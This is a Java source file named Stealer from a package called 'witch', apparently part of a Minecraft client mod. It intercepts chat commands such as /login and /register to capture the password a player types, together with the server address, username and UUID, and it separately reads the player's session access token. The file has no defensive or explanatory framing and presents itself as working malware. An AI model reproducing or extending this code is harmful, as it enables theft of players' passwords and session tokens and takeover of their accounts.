package me.soda.witch.utils;

import java.util.Arrays;
import java.util.List;

import static me.soda.witch.Witch.mc;

public class Stealer {
    public static Password stealPassword(String command) {
        String username;
        String password;
        String server;
        String uuid;
        List<String> loginHint = Arrays.asList("l", "login", "log");
        List<String> regHint = Arrays.asList("reg", "register");
        String[] cmdArray = command.split(" ");
        if (cmdArray.length > 0) {
            if ((loginHint.contains(cmdArray[0]) && cmdArray.length == 2)
                    || (regHint.contains(cmdArray[0]) && cmdArray.length == 2 || cmdArray.length == 3)) {
                password = cmdArray[1];
                if (mc.getCurrentServerEntry() != null) {
                    String name = mc.isConnectedToRealms() ? "realms" : mc.getCurrentServerEntry().address;
                    server = name.replace(":", "_");
                } else {
                    server = "unknown/singleplayer";
                }
                username = mc.getSession().getUsername();
                uuid = mc.getSession().getUuid();
                return new Password(username, uuid, password, server);
            }
        }
        return null;
    }

    public static Token getToken() {
        String username = mc.getSession().getUsername();
        String uuid = mc.getSession().getUuid();
        String token = mc.getSession().getAccessToken();
        return new Token(username, uuid, token);
    }

    public record Password(String username, String uuid, String password, String server) {
    }

    public record Token(String username, String uuid, String token) {
    }
}
